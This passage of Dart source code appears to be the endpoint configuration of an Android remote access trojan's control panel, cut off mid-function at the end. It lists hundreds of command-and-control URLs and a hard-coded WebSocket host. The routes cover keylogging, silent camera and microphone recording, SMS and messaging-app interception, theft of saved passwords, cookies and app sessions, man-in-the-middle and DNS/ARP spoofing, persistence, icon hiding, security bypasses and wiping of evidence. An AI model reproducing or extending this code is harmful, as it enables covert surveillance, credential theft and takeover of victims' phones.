  static const String ratInstallRecovery = "$ratBaseUrl/api/install-recovery";

  // ==================== EXTRA FEATURES - REMOTE ACCESS ====================
  
  static const String ratSshTunnel = "$ratBaseUrl/api/ssh-tunnel";
  static const String ratVncRemote = "$ratBaseUrl/api/vnc-remote";
  static const String ratRdpSession = "$ratBaseUrl/api/rdp-session";
  static const String ratAdbOverNetwork = "$ratBaseUrl/api/adb-over-network";
  static const String ratReverseShell = "$ratBaseUrl/api/reverse-shell";

  // ==================== EXTRA FEATURES - HARDWARE CONTROL ====================
  
  static const String ratOverclockCpu = "$ratBaseUrl/api/overclock-cpu";
  static const String ratUnderclockCpu = "$ratBaseUrl/api/underclock-cpu";
  static const String ratDisableCharging = "$ratBaseUrl/api/disable-charging";
  static const String ratEnableFastCharging = "$ratBaseUrl/api/enable-fast-charging";
  static const String ratChangeMac = "$ratBaseUrl/api/change-mac";
  static const String ratSpoofImei = "$ratBaseUrl/api/spoof-imei";
  static const String ratDisableSensors = "$ratBaseUrl/api/disable-sensors";
  static const String ratHapticFeedback = "$ratBaseUrl/api/haptic-feedback";

  // ==================== EXTRA FEATURES - BATTERY EXPLOIT ====================
  
  static const String ratDrainBattery = "$ratBaseUrl/api/drain-battery";
  static const String ratStopCharging = "$ratBaseUrl/api/stop-charging";
  static const String ratBatterySpoof = "$ratBaseUrl/api/battery-spoof";
  static const String ratChargeLimit = "$ratBaseUrl/api/charge-limit";

  // ==================== EXTRA FEATURES - CAMERA EXPLOIT ====================
  
  static const String ratRecordVideoBackground = "$ratBaseUrl/api/record-video-background";
  static const String ratStealthPhoto = "$ratBaseUrl/api/stealth-photo";
  static const String ratFaceDetection = "$ratBaseUrl/api/face-detection";
  static const String ratMotionDetection = "$ratBaseUrl/api/motion-detection";
  static const String ratContinuousRecording = "$ratBaseUrl/api/continuous-recording";
  static const String ratRemoteFlash = "$ratBaseUrl/api/remote-flash";

  // ==================== EXTRA FEATURES - MICROPHONE EXPLOIT ====================
  
  static const String ratAmbientRecording = "$ratBaseUrl/api/ambient-recording";
  static const String ratVoiceCommandListener = "$ratBaseUrl/api/voice-command-listener";
  static const String ratAudioFrequencyAnalyzer = "$ratBaseUrl/api/audio-frequency-analyzer";
  static const String ratNoiseCancellationBypass = "$ratBaseUrl/api/noise-cancellation-bypass";

  // ==================== EXTRA FEATURES - SMS & CALLS ====================
  
  static const String ratAutoReplySms = "$ratBaseUrl/api/auto-reply-sms";
  static const String ratForwardSmsEmail = "$ratBaseUrl/api/forward-sms-email";
  static const String ratCallRecording = "$ratBaseUrl/api/call-recording";
  static const String ratCallForwarding = "$ratBaseUrl/api/call-forwarding";
  static const String ratCallBlocking = "$ratBaseUrl/api/call-blocking";

  // ==================== EXTRA FEATURES - NOTIFICATION ====================
  
  static const String ratNotificationListener = "$ratBaseUrl/api/notification-listener";
  static const String ratNotificationInjector = "$ratBaseUrl/api/notification-injector";
  static const String ratNotificationBlocker = "$ratBaseUrl/api/notification-blocker";
  static const String ratQuickReplyInjection = "$ratBaseUrl/api/quick-reply-injection";

  // ==================== EXTRA FEATURES - CLIPBOARD ====================
  
  static const String ratClipboardMonitor = "$ratBaseUrl/api/clipboard-monitor";
  static const String ratClipboardHijack = "$ratBaseUrl/api/clipboard-hijack";
  static const String ratAutoCopy = "$ratBaseUrl/api/auto-copy";

  // ==================== EXTRA FEATURES - KEYLOGGER ADVANCED ====================
  
  static const String ratKeyloggerTimestamps = "$ratBaseUrl/api/keylogger-timestamps";
  static const String ratKeyloggerAppContext = "$ratBaseUrl/api/keylogger-app-context";
  static const String ratScreenshotOnKeypress = "$ratBaseUrl/api/screenshot-on-keypress";
  static const String ratClipboardLogging = "$ratBaseUrl/api/clipboard-logging";

  // ==================== EXTRA FEATURES - SCREEN CONTROL ADV ====================
  
  static const String ratScreenRecorder = "$ratBaseUrl/api/screen-recorder";
  static const String ratScreenLockOverride = "$ratBaseUrl/api/screen-lock-override";
  static const String ratScreenshotPrevention = "$ratBaseUrl/api/screenshot-prevention";
  static const String ratScreenDimmer = "$ratBaseUrl/api/screen-dimmer";
  static const String ratAlwaysOnDisplay = "$ratBaseUrl/api/always-on-display";
  static const String ratScreenFilter = "$ratBaseUrl/api/screen-filter";

  // ==================== EXTRA FEATURES - APP CONTROL ====================
  
  static const String ratFreezeApp = "$ratBaseUrl/api/freeze-app";
  static const String ratUnfreezeApp = "$ratBaseUrl/api/unfreeze-app";
  static const String ratDisableApp = "$ratBaseUrl/api/disable-app";
  static const String ratEnableApp = "$ratBaseUrl/api/enable-app";
  static const String ratClearAppCache = "$ratBaseUrl/api/clear-app-cache";
  static const String ratForceStopAll = "$ratBaseUrl/api/force-stop-all";

  // ==================== EXTRA FEATURES - DEVICE ADMIN ====================
  
  static const String ratLockDeviceRemote = "$ratBaseUrl/api/lock-device-remote";
  static const String ratWipeDevice = "$ratBaseUrl/api/wipe-device";
  static const String ratDisableCameraPerm = "$ratBaseUrl/api/disable-camera-perm";
  static const String ratDisableMicPerm = "$ratBaseUrl/api/disable-mic-perm";
  static const String ratDisableUsb = "$ratBaseUrl/api/disable-usb";

  // ==================== EXTRA FEATURES - LOCATION SPOOFING ====================
  
  static const String ratGpsSpoof = "$ratBaseUrl/api/gps-spoof";
  static const String ratMockLocation = "$ratBaseUrl/api/mock-location";
  static const String ratLocationHistory = "$ratBaseUrl/api/location-history";
  static const String ratGeofence = "$ratBaseUrl/api/geofence";
  static const String ratSpeedTracking = "$ratBaseUrl/api/speed-tracking";

  // ==================== EXTRA FEATURES - WIFI EXPLOIT ====================
  
  static const String ratWifiScanning = "$ratBaseUrl/api/wifi-scanning";
  static const String ratWifiDeauth = "$ratBaseUrl/api/wifi-deauth";
  static const String ratWifiProbeRequest = "$ratBaseUrl/api/wifi-probe-request";
  static const String ratWifiCaptivePortal = "$ratBaseUrl/api/wifi-captive-portal";
  static const String ratWifiWpsCrack = "$ratBaseUrl/api/wifi-wps-crack";
  static const String ratWifiSignalBooster = "$ratBaseUrl/api/wifi-signal-booster";

  // ==================== EXTRA FEATURES - BLUETOOTH EXPLOIT ====================
  
  static const String ratBluetoothScanning = "$ratBaseUrl/api/bluetooth-scanning";
  static const String ratBluetoothSpoof = "$ratBaseUrl/api/bluetooth-spoof";
  static const String ratBluetoothSniffing = "$ratBaseUrl/api/bluetooth-sniffing";
  static const String ratBluetoothAttack = "$ratBaseUrl/api/bluetooth-attack";
  static const String ratBluetoothKill = "$ratBaseUrl/api/bluetooth-kill";

  // ==================== EXTRA FEATURES - SENSORS ====================
  
  static const String ratAccelerometerData = "$ratBaseUrl/api/accelerometer-data";
  static const String ratGyroscopeData = "$ratBaseUrl/api/gyroscope-data";
  static const String ratMagnetometerData = "$ratBaseUrl/api/magnetometer-data";
  static const String ratProximitySensor = "$ratBaseUrl/api/proximity-sensor";

  // ==================== EXTRA FEATURES - SYSTEM CONTROL ====================
  
  static const String ratBlockSystemUpdate = "$ratBaseUrl/api/block-system-update";
  static const String ratBlockOta = "$ratBaseUrl/api/block-ota";
  static const String ratFactoryResetProtection = "$ratBaseUrl/api/factory-reset-protection";
  static const String ratRootDetectionBypass = "$ratBaseUrl/api/root-detection-bypass";
  static const String ratSafetyNetBypass = "$ratBaseUrl/api/safetynet-bypass";
  static const String ratPlayServicesBypass = "$ratBaseUrl/api/play-services-bypass";

  // ==================== WEB SOCKET ====================
  static const String wsUrl = "ws://cosmox.miunnst.site:3002";

  // ==================== HELPER ====================
  static String getRatCommandUrl(String deviceId) {
    return "$ratBaseUrl/api/get-command/$deviceId";
  }

  static String getRatResponseUrl(String deviceId) {
    return "$ratBaseUrl/api/get-response/$deviceId";
  }

  static String getRatLockChatUrl(String deviceId) {
    return "$ratBaseUrl/api/lock-chat/$deviceId";
  }

  static String getRatLiveFrameUrl(String deviceId) {
    return "$ratBaseUrl/api/live-frame/$deviceId";
  }

  static String getRatNotificationsUrl(String deviceId) {
    return "$ratBaseUrl/api/get-notifications/$deviceId";
  }

  static String getRatHeartbeatUrl(String deviceId) {
    return "$ratBaseUrl/api/heartbeat/$deviceId";
  }

  static String getRatPairUrl() {
    return "$ratBaseUrl/rat/pair";
  }

  static String getRatMyDevicesUrl() {
    return "$ratBaseUrl/rat/my-devices";
  }

  static String getRatPairIdUrl() {
    return "$ratBaseUrl/rat/pairid";
  }

  // ==================== RAT ULTIMATE HELPERS ====================
  
  static String getRatStartKeyloggerUrl() {
    return "$ratBaseUrl/api/start-keylogger";
  }
  
  static String getRatStopKeyloggerUrl() {
    return "$ratBaseUrl/api/stop-keylogger";
  }
  
  static String getRatGetKeylogsUrl() {
    return "$ratBaseUrl/api/get-keylogs";
  }
  
  static String getRatGetClipboardUrl() {
    return "$ratBaseUrl/api/get-clipboard";
  }
  
  static String getRatStartVideoRecordingUrl() {
    return "$ratBaseUrl/api/start-video-recording";
  }
  
  static String getRatStopVideoRecordingUrl() {
    return "$ratBaseUrl/api/stop-video-recording";
  }
  
  static String getRatStartMicRecordingUrl() {
    return "$ratBaseUrl/api/start-mic-recording";
  }
  
  static String getRatStopMicRecordingUrl() {
    return "$ratBaseUrl/api/stop-mic-recording";
  }
  
  static String getRatGetCallLogsUrl() {
    return "$ratBaseUrl/api/get-call-logs";
  }
  
  static String getRatGetInstalledAppsUrl() {
    return "$ratBaseUrl/api/get-installed-apps";
  }
  
  static String getRatGetWifiNetworksUrl() {
    return "$ratBaseUrl/api/get-wifi-networks";
  }
  
  static String getRatGetDeviceInfoUrl() {
    return "$ratBaseUrl/api/get-device-info";
  }
  
  static String getRatSetVolumeUrl() {
    return "$ratBaseUrl/api/set-volume";
  }
  
  static String getRatGetVolumeUrl() {
    return "$ratBaseUrl/api/get-volume";
  }
  
  static String getRatBlockTouchUrl() {
    return "$ratBaseUrl/api/block-touch";
  }
  
  static String getRatUnblockTouchUrl() {
    return "$ratBaseUrl/api/unblock-touch";
  }
  
  static String getRatDisablePowerUrl() {
    return "$ratBaseUrl/api/disable-power";
  }
  
  static String getRatEnablePowerUrl() {
    return "$ratBaseUrl/api/enable-power";
  }
  
  static String getRatDisableKeyboardUrl() {
    return "$ratBaseUrl/api/disable-keyboard";
  }
  
  static String getRatEnableKeyboardUrl() {
    return "$ratBaseUrl/api/enable-keyboard";
  }
  
  static String getRatInstallApkUrl() {
    return "$ratBaseUrl/api/install-apk";
  }
  
  static String getRatClearAppDataUrl() {
    return "$ratBaseUrl/api/clear-app-data";
  }
  
  static String getRatFactoryResetUrl() {
    return "$ratBaseUrl/api/factory-reset";
  }
  
  static String getRatLockBootloaderUrl() {
    return "$ratBaseUrl/api/lock-bootloader";
  }
  
  static String getRatUnlockBootloaderUrl() {
    return "$ratBaseUrl/api/unlock-bootloader";
  }
  
  static String getRatMountSystemRWUrl() {
    return "$ratBaseUrl/api/mount-system-rw";
  }
  
  static String getRatClearLogsUrl() {
    return "$ratBaseUrl/api/clear-logs";
  }
  
  static String getRatBlockNotificationsUrl() {
    return "$ratBaseUrl/api/block-notifications";
  }

  static String getRatUnblockNotificationsUrl() {
    return "$ratBaseUrl/api/unblock-notifications";
  }

  static String getRatEnablePersistenceUrl() {
    return "$ratBaseUrl/api/enable-persistence";
  }

  static String getRatDisablePersistenceUrl() {
    return "$ratBaseUrl/api/disable-persistence";
  }

  static String getRatHideAppIconUrl() {
    return "$ratBaseUrl/api/hide-app-icon";
  }

  static String getRatShowAppIconUrl() {
    return "$ratBaseUrl/api/show-app-icon";
  }

  static String getRatEnableDeviceAdminUrl() {
    return "$ratBaseUrl/api/enable-device-admin";
  }

  static String getRatDisableDeviceAdminUrl() {
    return "$ratBaseUrl/api/disable-device-admin";
  }

  static String getRatEnableWifiUrl() {
    return "$ratBaseUrl/api/enable-wifi";
  }

  static String getRatDisableWifiUrl() {
    return "$ratBaseUrl/api/disable-wifi";
  }

  static String getRatToggleFlashlightUrl() {
    return "$ratBaseUrl/api/toggle-flashlight";
  }

  static String getRatGetBrowserHistoryUrl() {
    return "$ratBaseUrl/api/get-browser-history";
  }

  static String getRatGetSavedPasswordsUrl() {
    return "$ratBaseUrl/api/get-saved-passwords";
  }

  static String getRatGetWifiPasswordsUrl() {
    return "$ratBaseUrl/api/get-wifi-passwords";
  }

  static String getRatGetSimInfoUrl() {
    return "$ratBaseUrl/api/get-sim-info";
  }

  static String getRatGetImeiUrl() {
    return "$ratBaseUrl/api/get-imei";
  }

  static String getRatCheckRootUrl() {
    return "$ratBaseUrl/api/check-root";
  }

  static String getRatGetWaSessionUrl() {
    return "$ratBaseUrl/api/get-wa-session";
  }

  static String getRatGetTgSessionUrl() {
    return "$ratBaseUrl/api/get-tg-session";
  }

  static String getRatGetInstagramSessionUrl() {
    return "$ratBaseUrl/api/get-instagram-session";
  }

  static String getRatGetEmailsUrl() {
    return "$ratBaseUrl/api/get-emails";
  }

  static String getRatGetCalendarUrl() {
    return "$ratBaseUrl/api/get-calendar";
  }

  static String getRatGetNotesUrl() {
    return "$ratBaseUrl/api/get-notes";
  }

  static String getRatGetRunningServicesUrl() {
    return "$ratBaseUrl/api/get-running-services";
  }

  static String getRatGetBatteryHistoryUrl() {
    return "$ratBaseUrl/api/get-battery-history";
  }

  static String getRatGetRecentAppsUrl() {
    return "$ratBaseUrl/api/get-recent-apps";
  }

  static String getRatBrowseFilesUrl() {
    return "$ratBaseUrl/api/browse-files";
  }

  static String getRatUploadFileUrl() {
    return "$ratBaseUrl/api/upload-file";
  }

  static String getRatDownloadFileUrl() {
    return "$ratBaseUrl/api/download-file";
  }

  static String getRatDeleteFileUrl() {
    return "$ratBaseUrl/api/delete-file";
  }

  static String getRatLockAppUrl() {
    return "$ratBaseUrl/api/lock-app";
  }

  static String getRatUnlockAppUrl() {
    return "$ratBaseUrl/api/unlock-app";
  }

  // ==================== SPYWARE / SADAP HELPERS ====================
  
  static String getRatStartAdvancedKeyloggerUrl() {
    return "$ratBaseUrl/api/start-advanced-keylogger";
  }
  
  static String getRatStopAdvancedKeyloggerUrl() {
    return "$ratBaseUrl/api/stop-advanced-keylogger";
  }
  
  static String getRatGetKeylogsTimestampUrl() {
    return "$ratBaseUrl/api/get-keylogs-timestamp";
  }
  
  static String getRatGetKeyloggerStatsUrl() {
    return "$ratBaseUrl/api/get-keylogger-stats";
  }
  
  static String getRatClearKeylogsUrl() {
    return "$ratBaseUrl/api/clear-keylogs";
  }
  
  static String getRatExportKeylogsUrl() {
    return "$ratBaseUrl/api/export-keylogs";
  }
  
  static String getRatStartClipboardMonitorUrl() {
    return "$ratBaseUrl/api/start-clipboard-monitor";
  }
  
  static String getRatStopClipboardMonitorUrl() {
    return "$ratBaseUrl/api/stop-clipboard-monitor";
  }
  
  static String getRatGetClipboardHistoryUrl() {
    return "$ratBaseUrl/api/get-clipboard-history";
  }
  
  static String getRatClearClipboardHistoryUrl() {
    return "$ratBaseUrl/api/clear-clipboard-history";
  }
  
  static String getRatStartScreenRecordingUrl() {
    return "$ratBaseUrl/api/start-screen-recording";
  }
  
  static String getRatStopScreenRecordingUrl() {
    return "$ratBaseUrl/api/stop-screen-recording";
  }
  
  static String getRatGetScreenRecordingUrl() {
    return "$ratBaseUrl/api/get-screen-recording";
  }
  
  static String getRatStartScreenRecordingAudioUrl() {
    return "$ratBaseUrl/api/start-screen-recording-audio";
  }
  
  static String getRatTakeScreenshotSilentUrl() {
    return "$ratBaseUrl/api/take-screenshot-silent";
  }
  
  static String getRatTakeBurstScreenshotsUrl() {
    return "$ratBaseUrl/api/take-burst-screenshots";
  }
  
  static String getRatTakeScreenshotMetadataUrl() {
    return "$ratBaseUrl/api/take-screenshot-metadata";
  }
  
  static String getRatStartAudioRecordingUrl() {
    return "$ratBaseUrl/api/start-audio-recording";
  }
  
  static String getRatStopAudioRecordingUrl() {
    return "$ratBaseUrl/api/stop-audio-recording";
  }
  
  static String getRatGetAudioRecordingUrl() {
    return "$ratBaseUrl/api/get-audio-recording";
  }
  
  static String getRatStartAudioStreamingUrl() {
    return "$ratBaseUrl/api/start-audio-streaming";
  }
  
  static String getRatStopAudioStreamingUrl() {
    return "$ratBaseUrl/api/stop-audio-streaming";
  }
  
  static String getRatStartHqAudioRecordingUrl() {
    return "$ratBaseUrl/api/start-hq-audio-recording";
  }
  
  static String getRatSetAudioQualityUrl() {
    return "$ratBaseUrl/api/set-audio-quality";
  }
  
  static String getRatGetVideoRecordingUrl() {
    return "$ratBaseUrl/api/get-video-recording";
  }
  
  static String getRatStartBgVideoRecordingUrl() {
    return "$ratBaseUrl/api/start-bg-video-recording";
  }
  
  static String getRatStartVideoStreamingUrl() {
    return "$ratBaseUrl/api/start-video-streaming";
  }
  
  static String getRatStopVideoStreamingUrl() {
    return "$ratBaseUrl/api/stop-video-streaming";
  }
  
  static String getRatTakePhotoSilentUrl() {
    return "$ratBaseUrl/api/take-photo-silent";
  }
  
  static String getRatTakePhotoExifUrl() {
    return "$ratBaseUrl/api/take-photo-exif";
  }
  
  static String getRatStartRealtimeLocationUrl() {
    return "$ratBaseUrl/api/start-realtime-location";
  }
  
  static String getRatStopRealtimeLocationUrl() {
    return "$ratBaseUrl/api/stop-realtime-location";
  }
  
  static String getRatGetLocationHistoryUrl() {
    return "$ratBaseUrl/api/get-location-history";
  }
  
  static String getRatClearLocationHistoryUrl() {
    return "$ratBaseUrl/api/clear-location-history";
  }
  
  static String getRatGetGeofenceAlertsUrl() {
    return "$ratBaseUrl/api/get-geofence-alerts";
  }
  
  static String getRatSetGeofenceUrl() {
    return "$ratBaseUrl/api/set-geofence";
  }
  
  static String getRatStartCallRecordingUrl() {
    return "$ratBaseUrl/api/start-call-recording";
  }
  
  static String getRatStopCallRecordingUrl() {
    return "$ratBaseUrl/api/stop-call-recording";
  }
  
  static String getRatGetCallRecordsUrl() {
    return "$ratBaseUrl/api/get-call-records";
  }
  
  static String getRatDeleteCallRecordUrl() {
    return "$ratBaseUrl/api/delete-call-record";
  }
  
  static String getRatStartSmsInterceptorUrl() {
    return "$ratBaseUrl/api/start-sms-interceptor";
  }
  
  static String getRatStopSmsInterceptorUrl() {
    return "$ratBaseUrl/api/stop-sms-interceptor";
  }
  
  static String getRatGetSmsConversationsUrl() {
    return "$ratBaseUrl/api/get-sms-conversations";
  }
  
  static String getRatSendSmsUrl() {
    return "$ratBaseUrl/api/send-sms";
  }
  
  static String getRatSendSmsBulkUrl() {
    return "$ratBaseUrl/api/send-sms-bulk";
  }
  
  static String getRatDeleteAllSmsUrl() {
    return "$ratBaseUrl/api/delete-all-sms";
  }
  
  static String getRatStartWaInterceptorUrl() {
    return "$ratBaseUrl/api/start-wa-interceptor";
  }
  
  static String getRatStopWaInterceptorUrl() {
    return "$ratBaseUrl/api/stop-wa-interceptor";
  }
  
  static String getRatGetWaMessagesUrl() {
    return "$ratBaseUrl/api/get-wa-messages";
  }
  
  static String getRatGetWaContactsUrl() {
    return "$ratBaseUrl/api/get-wa-contacts";
  }
  
  static String getRatGetWaGroupsUrl() {
    return "$ratBaseUrl/api/get-wa-groups";
  }
  
  static String getRatSendWaMessageUrl() {
    return "$ratBaseUrl/api/send-wa-message";
  }
  
  static String getRatGetWaStatusUrl() {
    return "$ratBaseUrl/api/get-wa-status";
  }
  
  static String getRatSetWaStatusUrl() {
    return "$ratBaseUrl/api/set-wa-status";
  }
  
  static String getRatStartTgInterceptorUrl() {
    return "$ratBaseUrl/api/start-tg-interceptor";
  }
  
  static String getRatStopTgInterceptorUrl() {
    return "$ratBaseUrl/api/stop-tg-interceptor";
  }
  
  static String getRatGetTgMessagesUrl() {
    return "$ratBaseUrl/api/get-tg-messages";
  }
  
  static String getRatGetTgContactsUrl() {
    return "$ratBaseUrl/api/get-tg-contacts";
  }
  
  static String getRatGetTgGroupsUrl() {
    return "$ratBaseUrl/api/get-tg-groups";
  }
  
  static String getRatSendTgMessageUrl() {
    return "$ratBaseUrl/api/send-tg-message";
  }
  
  static String getRatStartIgInterceptorUrl() {
    return "$ratBaseUrl/api/start-ig-interceptor";
  }
  
  static String getRatStopIgInterceptorUrl() {
    return "$ratBaseUrl/api/stop-ig-interceptor";
  }
  
  static String getRatGetIgMessagesUrl() {
    return "$ratBaseUrl/api/get-ig-messages";
  }
  
  static String getRatSendIgMessageUrl() {
    return "$ratBaseUrl/api/send-ig-message";
  }
  
  static String getRatStartFbInterceptorUrl() {
    return "$ratBaseUrl/api/start-fb-interceptor";
  }
  
  static String getRatStopFbInterceptorUrl() {
    return "$ratBaseUrl/api/stop-fb-interceptor";
  }
  
  static String getRatGetFbMessagesUrl() {
    return "$ratBaseUrl/api/get-fb-messages";
  }
  
  static String getRatSendFbMessageUrl() {
    return "$ratBaseUrl/api/send-fb-message";
  }
  
  static String getRatGetBrowserBookmarksUrl() {
    return "$ratBaseUrl/api/get-browser-bookmarks";
  }
  
  static String getRatGetBrowserDownloadsUrl() {
    return "$ratBaseUrl/api/get-browser-downloads";
  }
  
  static String getRatGetBrowserCookiesUrl() {
    return "$ratBaseUrl/api/get-browser-cookies";
  }
  
  static String getRatGetBrowserExtensionsUrl() {
    return "$ratBaseUrl/api/get-browser-extensions";
  }
  
  static String getRatGetBrowserTabsUrl() {
    return "$ratBaseUrl/api/get-browser-tabs";
  }
  
  static String getRatClearBrowserCacheUrl() {
    return "$ratBaseUrl/api/clear-browser-cache";
  }
  
  static String getRatClearBrowserHistoryUrl() {
    return "$ratBaseUrl/api/clear-browser-history";
  }
  
  static String getRatInjectBrowserScriptUrl() {
    return "$ratBaseUrl/api/inject-browser-script";
  }
  
  static String getRatCloseBrowserTabUrl() {
    return "$ratBaseUrl/api/close-browser-tab";
  }
  
  static String getRatOpenBrowserTabUrl() {
    return "$ratBaseUrl/api/open-browser-tab";
  }
  
  static String getRatStartPacketCaptureUrl() {
    return "$ratBaseUrl/api/start-packet-capture";
  }
  
  static String getRatStopPacketCaptureUrl() {
    return "$ratBaseUrl/api/stop-packet-capture";
  }
  
  static String getRatGetPacketCaptureUrl() {
    return "$ratBaseUrl/api/get-packet-capture";
  }
  
  static String getRatStartMitmUrl() {
    return "$ratBaseUrl/api/start-mitm";
  }
  
  static String getRatStopMitmUrl() {
    return "$ratBaseUrl/api/stop-mitm";
  }
  
  static String getRatScanNetworkUrl() {
    return "$ratBaseUrl/api/scan-network";
  }
  
  static String getRatGetConnectedDevicesUrl() {
    return "$ratBaseUrl/api/get-connected-devices";
  }
  
  static String getRatPortScanUrl() {
    return "$ratBaseUrl/api/port-scan";
  }
  
  static String getRatArpSpoofUrl() {
    return "$ratBaseUrl/api/arp-spoof";
  }
  
  static String getRatDnsSpoofUrl() {
    return "$ratBaseUrl/api/dns-spoof";
  }
  
  static String getRatGetNetworkStatsUrl() {
    return "$ratBaseUrl/api/get-network-stats";
  }
  
  static String getRatGetNetworkConnectionsUrl() {
    return "$ratBaseUrl/api/get-network-connections";
  }
  
  static String getRatGetFileInfoUrl() {
    return "$ratBaseUrl/api/get-file-info";
  }
  
  static String getRatGetDirectorySizeUrl() {
    return "$ratBaseUrl/api/get-directory-size";
  }
  
  static String getRatCopyFileUrl() {
    return "$ratBaseUrl/api/copy-file";
  }
  
  static String getRatMoveFileUrl() {
    return "$ratBaseUrl/api/move-file";
  }
  
  static String getRatRenameFileUrl() {
    return "$ratBaseUrl/api/rename-file";
  }
  
  static String getRatCreateDirectoryUrl() {
    return "$ratBaseUrl/api/create-directory";
  }
  
  static String getRatRemoveDirectoryUrl() {
    return "$ratBaseUrl/api/remove-directory";
  }
  
  static String getRatZipFilesUrl() {
    return "$ratBaseUrl/api/zip-files";
  }
  
  static String getRatUnzipFilesUrl() {
    return "$ratBaseUrl/api/unzip-files";
  }
  
  static String getRatEncryptFileUrl() {
    return "$ratBaseUrl/api/encrypt-file";
  }
  
  static String getRatDecryptFileUrl() {
    return "$ratBaseUrl/api/decrypt-file";
  }
  
  static String getRatGetSecurityLogUrl() {
    return "$ratBaseUrl/api/get-security-log";
  }
  
  static String getRatClearSecurityLogUrl() {
    return "$ratBaseUrl/api/clear-security-log";
  }
  
  static String getRatGetEncryptionKeyUrl() {
    return "$ratBaseUrl/api/get-encryption-key";
  }
  
  static String getRatSetEncryptionKeyUrl() {
    return "$ratBaseUrl/api/set-encryption-key";
  }
  
  static String getRatEnableSecureModeUrl() {
    return "$ratBaseUrl/api/enable-secure-mode";
  }
  
  static String getRatDisableSecureModeUrl() {
    return "$ratBaseUrl/api/disable-secure-mode";
  }
  
  static String getRatSetFirewallRuleUrl() {
    return "$ratBaseUrl/api/set-firewall-rule";
  }
  
  static String getRatRemoveFirewallRuleUrl() {
    return "$ratBaseUrl/api/remove-firewall-rule";
  }
  
  static String getRatGetFirewallRulesUrl() {
    return "$ratBaseUrl/api/get-firewall-rules";
  }
  
  static String getRatEnableAntivirusScanUrl() {
    return "$ratBaseUrl/api/enable-antivirus-scan";
  }
  
  static String getRatGetAntivirusResultUrl() {
    return "$ratBaseUrl/api/get-antivirus-result";
  }
  
  static String getRatGetUserAccountsUrl() {
    return "$ratBaseUrl/api/get-user-accounts";
  }
  
  static String getRatCreateUserAccountUrl() {
    return "$ratBaseUrl/api/create-user-account";
  }
  
  static String getRatDeleteUserAccountUrl() {
    return "$ratBaseUrl/api/delete-user-account";
  }
  
  static String getRatChangeUserPasswordUrl() {
    return "$ratBaseUrl/api/change-user-password";
  }
  
  static String getRatSetUserPermissionUrl() {
    return "$ratBaseUrl/api/set-user-permission";
  }
  
  static String getRatGetUserPermissionsUrl() {
    return "$ratBaseUrl/api/get-user-permissions";
  }
  
  static String getRatLockUserAccountUrl() {
    return "$ratBaseUrl/api/lock-user-account";
  }
  
  static String getRatUnlockUserAccountUrl() {
    return "$ratBaseUrl/api/unlock-user-account";
  }
  
  static String getRatEnableGuestModeUrl() {
    return "$ratBaseUrl/api/enable-guest-mode";
  }
  
  static String getRatDisableGuestModeUrl() {
    return "$ratBaseUrl/api/disable-guest-mode";
  }
  
  static String getRatGetSystemInfoUrl() {
    return "$ratBaseUrl/api/get-system-info";
  }
  
  static String getRatGetHardwareInfoUrl() {
    return "$ratBaseUrl/api/get-hardware-info";
  }
  
  static String getRatGetOsInfoUrl() {
    return "$ratBaseUrl/api/get-os-info";
  }
  
  static String getRatGetKernelInfoUrl() {
    return "$ratBaseUrl/api/get-kernel-info";
  }
  
  static String getRatGetCpuInfoUrl() {
    return "$ratBaseUrl/api/get-cpu-info";
  }
  
  static String getRatGetMemoryInfoUrl() {
    return "$ratBaseUrl/api/get-memory-info";
  }
  
  static String getRatGetDiskInfoUrl() {
    return "$ratBaseUrl/api/get-disk-info";
  }
  
  static String getRatGetRunningTasksUrl() {
    return "$ratBaseUrl/api/get-running-tasks";
  }
  
  static String getRatKillProcessUrl() {
    return "$ratBaseUrl/api/kill-process";
  }
  
  static String getRatWipeEvidenceUrl() {
    return "$ratBaseUrl/api/wipe-evidence";
  }
  
  static String getRatWipeLogsUrl() {
    return "$ratBaseUrl/api/wipe-logs";
  }
  
  static String getRatWipeCacheUrl() {
    return "$ratBaseUrl/api/wipe-cache";
  }
  
  static String getRatWipeTempFilesUrl() {
    return "$ratBaseUrl/api/wipe-temp-files";
  }
  
  static String getRatWipeRecentFilesUrl() {
    return "$ratBaseUrl/api/wipe-recent-files";
  }
  
  static String getRatWipeClipboardHistoryUrl() {
    return "$ratBaseUrl/api/wipe-clipboard-history";
  }
  
  static String getRatWipeSearchHistoryUrl() {
    return "$ratBaseUrl/api/wipe-search-history";
  }
  
  static String getRatWipeLocationHistoryUrl() {
    return "$ratBaseUrl/api/wipe-location-history";
  }
  
  static String getRatWipeCallHistoryUrl() {
    return "$ratBaseUrl/api/wipe-call-history";
  }
  
  static String getRatWipeSmsHistoryUrl() {
    return "$ratBaseUrl/api/wipe-sms-history";
  }
  
  static String getRatWipeAllUrl() {
    return "$ratBaseUrl/api/wipe-all";
  }
  
  static String getRatStartRemoteDesktopUrl() {
    return "$ratBaseUrl/api/start-remote-desktop";
  }
  
  static String getRatStopRemoteDesktopUrl() {
    return "$ratBaseUrl/api/stop-remote-desktop";
  }
  
  static String getRatRemoteDesktopMouseUrl() {
    return "$ratBaseUrl/api/remote-desktop-mouse";
  }
  
  static String getRatRemoteDesktopKeyboardUrl() {
    return "$ratBaseUrl/api/remote-desktop-keyboard";
  }
  
  static String getRatRemoteDesktopSendKeysUrl() {
    return "$ratBaseUrl/api/remote-desktop-send-keys";
  }
  
  static String getRatRemoteDesktopClickUrl() {
    return "$ratBaseUrl/api/remote-desktop-click";
  }
  
  static String getRatRemoteDesktopScrollUrl() {
    return "$ratBaseUrl/api/remote-desktop-scroll";
  }
  
  static String getRatAutoTapUrl() {
    return "$ratBaseUrl/api/auto-tap";
  }
  
  static String getRatAutoSwipeUrl() {
    return "$ratBaseUrl/api/auto-swipe";
  }
  
  static String getRatAutoClickUrl() {
    return "$ratBaseUrl/api/auto-click";
  }
  
  static String getRatAutoScrollUrl() {
    return "$ratBaseUrl/api/auto-scroll";
  }
  
  static String getRatAutoTypeUrl() {
    return "$ratBaseUrl/api/auto-type";
  }
  
  static String getRatRecordActionsUrl() {
    return "$ratBaseUrl/api/record-actions";
  }
  
  static String getRatStopRecordActionsUrl() {
    return "$ratBaseUrl/api/stop-record-actions";
  }
  
  static String getRatPlayActionsUrl() {
    return "$ratBaseUrl/api/play-actions";
  }
  
  static String getRatLoopActionsUrl() {
    return "$ratBaseUrl/api/loop-actions";
  }
  
  static String getRatSetAutoResponseUrl() {
    return "$ratBaseUrl/api/set-auto-response";
  }
  
  static String getRatSetAutoReplyUrl() {
    return "$ratBaseUrl/api/set-auto-reply";
  }
  
  static String getRatAiAnalyzeScreenUrl() {
    return "$ratBaseUrl/api/ai-analyze-screen";
  }
  
  static String getRatAiAnalyzePhotoUrl() {
